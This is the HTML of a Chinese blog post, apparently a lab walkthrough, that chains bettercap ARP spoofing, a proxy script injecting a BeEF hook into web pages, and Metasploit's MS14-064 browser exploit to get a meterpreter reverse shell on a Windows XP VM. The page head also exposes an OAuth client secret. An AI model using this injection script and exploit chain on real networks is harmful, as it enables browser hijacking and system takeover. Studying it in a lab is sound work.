@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html><head>
+<title> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试</title>
+
+
+
+
+<meta charset="utf-8">
+<meta name="X-UA-Compatible" content="IE=edge">
+<meta name="google-site-verification" content="EGsIpghqjISluKEkLB7IF_JGYSK3RSBt-nZwTiaQcrM">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+<meta content="telephone=no" name="format-detection">
+<meta name="description" content="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload.">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<meta property="og:title" content=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试" />
+<meta property="og:description" content="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" />
+<meta property="article:published_time" content="2021-02-02T13:43:23+08:00" />
+<meta property="article:modified_time" content="2021-02-02T13:43:23+08:00" /><meta property="og:site_name" content="WeepingDogel&#39;s Blog" />
+
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试"/>
+<meta name="twitter:description" content="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload."/>
+
+
+
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-NMWMSQB0MF', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+<script src="/vendor/js/jquery.min.js" ></script>
+<script src="/vendor/js/popper.min.js" ></script>
+<script src="/vendor/js/bootstrap.min.js" ></script>
+<script src="/vendor/js/smooth-scroll.polyfills.min.js" ></script>
+<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
+<script src="/vendor/js/vue.min.js" ></script>
+
+
+
+
+<link rel="icon" href="https://avatars.githubusercontent.com/u/44858874">
+
+
+
+
+<link rel="stylesheet" href="https://weepingdogel.github.io/scss/journal.min.c116bc90d171283f099f173854157ec8f183f9073b93443b2c8ad82899ee9025.css" integrity="sha256-wRa8kNFxKD8Jnxc4VBV&#43;yPGD&#43;Qc7k0Q7LIrYKJnukCU=" media="screen">
+
+
+
+<link rel="stylesheet" href="https://weepingdogel.github.io/scss/dark-mode.min.552aae4638a84aa57cf0b195750a49ea9131d3bb621d1ed3ebc9b14b18166536.css" integrity="sha256-VSquRjioSqV88LGVdQpJ6pEx07tiHR7T68mxSxgWZTY=" media="screen">
+
+
+<script src="https://weepingdogel.github.io//js/loadCSS.js"></script>
+<script>
+  loadCSS("https://fonts.googleapis.com/css?family=Lora|Montserrat|Fira+Mono|Noto+Serif+SC|Material+Icons");
+</script>
+
+
+
+
+  
+    <script src="https://weepingdogel.github.io//js/toc-collapse.js"></script>
+  
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="/vendor/js/md5.min.js"></script>
+<script>
+  var gitalk = new Gitalk({
+  clientID: 'a1e928de856334c726b3',
+  clientSecret: 'f509df81e9d11e081635dbd9ebba466964694e48',
+  repo: 'WeepingDogel.github.io',
+  owner: 'weepingdogel',
+  admin: ['weepingdogel'],
+  id: md5(location.pathname),
+  distractionFreeMode: 'false'
+  });
+  window.onload = function () {
+        gitalk.render('gitalk-container')
+  }
+</script>
+
+
+
+
+
+
+
+
+</head>
+<body>
+    	<div id="app"><div ref="sideContainer" class="side-container">
+    
+    <a class="a-block nav-head false" href="https://weepingdogel.github.io/">
+    
+        <div class="nav-title">
+            WeepingDogel&#39;s Blog
+        </div>
+        
+        <div class="nav-subtitle">
+            Write to share.
+        </div>
+        
+    </a>
+
+    <div class="nav-link-list">
+        
+        
+            
+            
+            
+                
+            
+            
+            
+            <a class="a-block nav-link-item active" href="/posts">
+                Posts
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/categories">
+                分类
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/tags">
+                标签
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/index.xml">
+                RSS订阅
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/friends">
+                Friends
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/about">
+                关于(About)
+            </a>
+            
+        
+    </div>
+
+    
+
+    <div class="nav-footer">
+        
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://amazingrise.net">Rise</a>
+<br>
+移植自 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	WeepingDogel 本站遵循 CC-BY-NC 4.0 协议
+	
+
+    </div>
+    
+</div><div ref="extraContainer" class="extra-container">
+    
+    
+    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- 目录 -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
+									序
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e7%8e%af%e5%a2%83" onclick="onNavClick(`#测试环境-nav`)" id="测试环境-nav">
+									测试环境
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%94%a8%e5%88%b0%e7%9a%84%e5%b7%a5%e5%85%b7" onclick="onNavClick(`#用到的工具-nav`)" id="用到的工具-nav">
+									用到的工具
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#测试过程-nav`)" id="测试过程-nav">
+									测试过程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%bb%93%e5%b0%be" onclick="onNavClick(`#结尾-nav`)" id="结尾-nav">
+									结尾
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
+									参考链接
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+    
+    <div class="pagination">
+        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
+            <i class="material-icons pagination-action-icon">
+                keyboard_arrow_up
+            </i>
+        </a>
+        
+        <a class="pagination-action" v-on:click="toggleDarkMode">
+            <i class="material-icons pagination-action-icon" v-if="isDarkMode">
+                brightness_4
+            </i>
+            <i class="material-icons pagination-action-icon" v-else="isDarkMode">
+                brightness_7
+            </i>
+        </a>
+        
+        
+    </div>
+</div>
+<div class="single-column-drawer-container" ref="drawer"
+     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
+    <div class="drawer-content">
+        <div class="drawer-menu">
+            
+            
+            
+                
+                
+                
+                    
+                
+                
+                
+                <a class="a-block drawer-menu-item active" href="/posts">
+                    Posts
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/categories">
+                    分类
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/tags">
+                    标签
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/index.xml">
+                    RSS订阅
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/friends">
+                    Friends
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/about">
+                    关于(About)
+                </a>
+                
+            
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- 目录 -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
+									序
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e7%8e%af%e5%a2%83" onclick="onNavClick(`#测试环境-nav`)" id="测试环境-nav">
+									测试环境
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%94%a8%e5%88%b0%e7%9a%84%e5%b7%a5%e5%85%b7" onclick="onNavClick(`#用到的工具-nav`)" id="用到的工具-nav">
+									用到的工具
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#测试过程-nav`)" id="测试过程-nav">
+									测试过程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%bb%93%e5%b0%be" onclick="onNavClick(`#结尾-nav`)" id="结尾-nav">
+									结尾
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
+									参考链接
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+            
+        </div>
+    </div>
+</div>
+<transition name="fade">
+    <div v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+</transition>
+<nav ref="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div ref="navBackground" class="nav-background"></div>
+    <div class="container container-narrow nav-content">
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
+            <i class="material-icons">
+                menu
+            </i>
+        </button>
+        <a ref="navTitle" class="navbar-brand" href="https://weepingdogel.github.io/">
+            WeepingDogel&#39;s Blog
+        </a>
+        
+        <button type="button" class="nav-darkmode-toggle" v-on:click="toggleDarkMode">
+            <i class="material-icons" v-if="isDarkMode">
+                brightness_4
+            </i>
+            <i class="material-icons" v-else="isDarkMode">
+                brightness_7
+            </i>
+        </button>
+        
+    </div>
+</nav>
+<div class="single-column-header-container" ref="pageHead"
+     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
+    <a href="https://weepingdogel.github.io/">
+        <div class="single-column-header-title">WeepingDogel&#39;s Blog</div>
+        
+        <div class="single-column-header-subtitle">Write to share.</div>
+        
+
+    </a>
+</div>
+
+            <div id="content">
+<div ref="streamContainer" class="stream-container">
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
+                
+            
+
+            <div class="post-head-wrapper"
+                
+                    
+                    
+                    style="background-image: url('https://weepingdogel.github.io/img/2021-02-02_13-51.png')"
+                    
+                
+            >
+                <div class="post-title">
+                     Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试
+                    
+                    <div class="post-subtitle">
+                        先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload.
+                    </div>
+                    
+                    <div class="post-meta">
+                        
+                        <time itemprop="datePublished">
+                            2021-02-02 13:43
+                        </time>
+                        
+
+                        
+                            <i class="material-icons" style="">folder</i>
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>
+                                &nbsp;
+                        
+
+                        
+                            <i class="material-icons" style="">label</i>
+                            
+                                <a href="/tags/beef">beef</a>
+                                &nbsp;
+                            
+                                <a href="/tags/bettercap">bettercap</a>
+                                &nbsp;
+                            
+                                <a href="/tags/linux">Linux</a>
+                                &nbsp;
+                            
+                                <a href="/tags/metasploit">metasploit</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E7%AC%94%E8%AE%B0">笔记</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>
+                                &nbsp;
+                            
+                                <a href="/tags/arp-%E6%AC%BA%E9%AA%97">ARP 欺骗</a>
+                                &nbsp;
+                            
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <h2 id="序">序</h2>
+<p>嗯&hellip; 惯例是要先说点废话嘛..</p>
+<p>今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～</p>
+<p>然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～</p>
+<p>不多说啦，我们开始～</p>
+<h3 id="测试环境">测试环境</h3>
+<p>啊咧，先说说测试环境。</p>
+<ul>
+<li>
+<p>攻击机</p>
+<ul>
+<li>Arch Linux</li>
+<li>192.168.101.15</li>
+</ul>
+</li>
+<li>
+<p>靶机</p>
+<ul>
+<li>Windows XP on VirtualBox</li>
+<li>192.168.101.43</li>
+</ul>
+</li>
+</ul>
+<p>条件有限，就只能用 XP 啦～</p>
+<h3 id="用到的工具">用到的工具</h3>
+<ol>
+<li>bettercap
+<ul>
+<li>首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧&hellip;</li>
+</ul>
+</li>
+<li>beef
+<ul>
+<li>用来劫持浏览器&hellip; 然后可以干很多事情，具体的也不是很了解呢。</li>
+</ul>
+</li>
+<li>msf
+<ul>
+<li>这个就是老朋友啦～</li>
+</ul>
+</li>
+</ol>
+<p>什么? nmap? 这次用不着哦～</p>
+<h2 id="测试过程">测试过程</h2>
+<p>首先是打开 <code>bettercap</code></p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo bettercap
+</code></pre></div><p>然后我们会看到这样的返回结果..</p>
+<p><img src="/img/2021-02-02_14-18.png" alt=""></p>
+<p><strong>注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。</strong></p>
+<p><img src="/img/2021-02-02_14-20.png" alt=""></p>
+<p>然后设置 arp 欺骗的目标：</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">set arp.spoof.targets 192.168.101.43
+</code></pre></div><p><strong>这里设置的 targets 是靶机的地址哦</strong></p>
+<p>接下来启动 beef ，和上面说的一样要加 <code>sudo</code> 。</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo beef
+</code></pre></div><p>得到返回：</p>
+<p><img src="/img/2021-02-02_14-28.png" alt=""></p>
+<p>那么来说说终端里显示的这几个链接</p>
+<ul>
+<li>Hook URL: <a href="http://192.168.101.15:3000/hook.js">http://192.168.101.15:3000/hook.js</a>
+<ul>
+<li>这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～</li>
+<li>一会儿我们要把它写进一个攻击脚本里～</li>
+</ul>
+</li>
+<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel">http://192.168.101.15:3000/ui/panel</a>
+<ul>
+<li>这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。
+<img src="/img/Screenshot_2021-02-02_BeEF_Control_Panel.png" alt=""></li>
+</ul>
+</li>
+</ul>
+<p>关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录<code>（beef:beef）</code>，甚至不能启动，比如我的 Arch 就会这样。</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[14:40:25][!] ERROR: Default username and password in use!
+[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
+</code></pre></div><p>这个时候你需要做的是修改 <code>config.yaml</code> 这个文件中的用户名和密码，我的位置在 <code>/usr/share/beef/config.yaml</code></p>
+<p>改成这样</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#fb660a;font-weight:bold">beef</span>:<span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#fb660a;font-weight:bold">version</span>:<span style="color:#888"> </span><span style="color:#0086d2">&#39;0.5.0.0-alpha-pre&#39;</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#080;background-color:#0f140f;font-style:italic"># More verbose messages (server-side)</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#fb660a;font-weight:bold">debug</span>:<span style="color:#888"> </span><span style="color:#fb660a;font-weight:bold">false</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#080;background-color:#0f140f;font-style:italic"># More verbose messages (client-side)</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#fb660a;font-weight:bold">client_debug</span>:<span style="color:#888"> </span><span style="color:#fb660a;font-weight:bold">false</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#080;background-color:#0f140f;font-style:italic"># Used for generating secure tokens</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#fb660a;font-weight:bold">crypto_default_value_length</span>:<span style="color:#888"> </span><span style="color:#0086f7;font-weight:bold">80</span><span style="color:#888">
+</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#080;background-color:#0f140f;font-style:italic"># Credentials to authenticate in BeEF.</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#080;background-color:#0f140f;font-style:italic"># Used by both the RESTful API and the Admin interface</span><span style="color:#888">
+</span><span style="color:#888">    </span><span style="color:#fb660a;font-weight:bold">credentials</span>:<span style="color:#888">
+</span><span style="color:#888">        </span><span style="color:#fb660a;font-weight:bold">user</span>:<span style="color:#888">   </span><span style="color:#0086d2">&#34;随便起个名字&#34;</span><span style="color:#888">
+</span><span style="color:#888">        </span><span style="color:#fb660a;font-weight:bold">passwd</span>:<span style="color:#888"> </span><span style="color:#0086d2">&#34;随便想个密码&#34;</span><span style="color:#888">
+</span></code></pre></div><p>然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。</p>
+<p>好了，话不多说，我们继续。</p>
+<p>接下来我们要做的是写一个 js 脚本，给 bettercap 用。</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#fb660a;font-weight:bold">function</span> onResponse(req,res){
+    <span style="color:#fb660a;font-weight:bold">if</span>(res.ContentType.indexOf(<span style="color:#0086d2">&#39;text/html&#39;</span>)==<span style="color:#0086f7;font-weight:bold">0</span>){
+        <span style="color:#fb660a;font-weight:bold">var</span> body=res.ReadBody();
+        <span style="color:#fb660a;font-weight:bold">if</span>(body.indexOf(<span style="color:#0086d2">&#39;&lt;/head&gt;&#39;</span>)!=-<span style="color:#0086f7;font-weight:bold">1</span>){
+            res.Body=body.replace(
+                <span style="color:#0086d2">&#39;&lt;/head&gt;&#39;</span>,
+               <span style="color:#0086d2">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
+            );
+            }
+        }
+}
+</code></pre></div><p>将这个文件保存到你知道的目录，我将它保存到 <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code></p>
+<p>然后我们回到 bettercap，设置 <code>http.proxy.script</code> 这个参数为上面这个路径：</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
+</code></pre></div><p>然后依次启动 <code>net.probe</code>、<code>arp.spoof</code>、<code>http.proxy</code></p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">net.probe on
+</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">arp.spoof on
+</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http.proxy on
+</code></pre></div><p>嗯&hellip; 接下来就启动好了&hellip;</p>
+<p><img src="/img/2021-02-02_15-12.png" alt=""></p>
+<p>然后我们让靶机打开浏览器，打开一个网页&hellip;</p>
+<p>IE8 已经不支持 bing 的 https 了，所以一打开就上钩了..</p>
+<p><img src="/img/VirtualBox_XP_02_02_2021_15_25_46.png" alt=""></p>
+<p><img src="/img/2021-02-02_15-25.png" alt=""></p>
+<p>然后我们能做的事情就很多了</p>
+<p><img src="/img/2021-02-02_15-27.png" alt=""></p>
+<p>我决定使用内个 clippy 的模块，绑定一个 <code>ms14-064</code> 的地址，现在轮到 msf 出场了。</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfconsole
+</code></pre></div><p><img src="/img/2021-02-02_15-31.png" alt=""></p>
+<p>启用模块</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">use exploit/windows/browser/ms14_064_ole_code_execution
+</code></pre></div><p>看看模块的描述</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">info 
+</code></pre></div><blockquote>
+<p>Description:</p>
+<p>This module exploits the Windows OLE Automation array vulnerability,
+CVE-2014-6332. The vulnerability is known to affect Internet
+Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
+and no patch for Windows XP. However, this exploit will only target
+Windows XP and Windows 7 box due to the Powershell limitation.
+Windows XP by defaults supports VBS, therefore it is used as the
+attack vector. On other newer Windows systems, the exploit will try
+using Powershell instead.</p>
+</blockquote>
+<p>机翻一下就是：</p>
+<blockquote>
+<p>该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。</p>
+</blockquote>
+<p>看看设置</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">show options
+</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+
+   Name                   Current Setting  Required  Description
+   ----                   ---------------  --------  -----------
+   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
+   Retries                true             no        Allow the browser to retry the module
+   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT                8080             yes       The local port to listen on.
+   SSL                    false            no        Negotiate SSL for incoming connections
+   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
+   TRYUAC                 false            yes       Ask victim to start as Administrator
+   URIPATH                                 no        The URI to use for this exploit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP
+</code></pre></div><p>一般来讲我们只需要设置一个 <code>SRVHOST</code> 就可以了，但是刚刚 <code>bettercap</code> 把 <code>8080</code> 端口给占用了，因此我们需要重新设置一个 <code>SRVPORT</code>。</p>
+<p><code>SRVHOST</code> 设置为攻击机的地址</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">set SRVHOST 192.168.101.15
+</code></pre></div><p><code>SRVPORT</code> 任意指定一个空闲的端口</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">set SRVPORT 9999
+</code></pre></div><p>执行</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">exploit
+</code></pre></div><p>接下来我们得到了</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.101.15:4444 
+[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
+[*] Server started.
+</code></pre></div><p>先把默认的 <code>Clippy image directory</code> 地址改成攻击机的地址，再把这个链接 <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> 填入 <code>Executable</code> 这一栏里面。</p>
+<p><img src="/img/2021-02-02_15-52.png" alt=""></p>
+<p>然后点击 <code>Execute</code></p>
+<p>这时，靶机就会发生一件有趣的事情</p>
+<p><img src="/img/VirtualBox_XP_02_02_2021_15_53_43.png" alt=""></p>
+<p>无论点击哪个，都会跳转到 msf 的链接。</p>
+<p>点击之后，msf 有了反应</p>
+<p><img src="/img/2021-02-02_15-55.png" alt=""></p>
+<p>一个 <code>meterpreter</code> 连接建立了</p>
+<p><img src="/img/2021-02-02_15-57.png" alt=""></p>
+<p>进入这个会话</p>
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sessions -i 1
+</code></pre></div><p><img src="/img/2021-02-02_15-59.png" alt=""></p>
+<p>这时我们就可以正常使用 <code>meterpreter</code> 操作这台靶机了..</p>
+<p><img src="/img/2021-02-02_16-00.png" alt=""></p>
+<p><code>getsystem</code> 提权也没有问题。</p>
+<p>至于 <code>meterpreter</code> 的用法就不再继续写下去了，因为之前写过（逃。</p>
+<p>然后到这里就算成功一大半了，剩下的就是后渗透，说很久都说不完呢～就到这里吧～</p>
+<h2 id="结尾">结尾</h2>
+<p>呼~ 写完了.. qwq</p>
+<p>不过要声明一下，本文内容仅限于测试学习使用，<strong>别拿去干坏事</strong>，否则后果自负哦～</p>
+<p>最后，本站遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC 4.0 协议</a>，转载请注明出处</p>
+<hr>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li>
+<p><a href="https://cvedetails.com/cve/CVE-2014-6332/">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></p>
+</li>
+<li>
+<p><a href="https://www.exploit-db.com/exploits/35229">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></p>
+</li>
+<li>
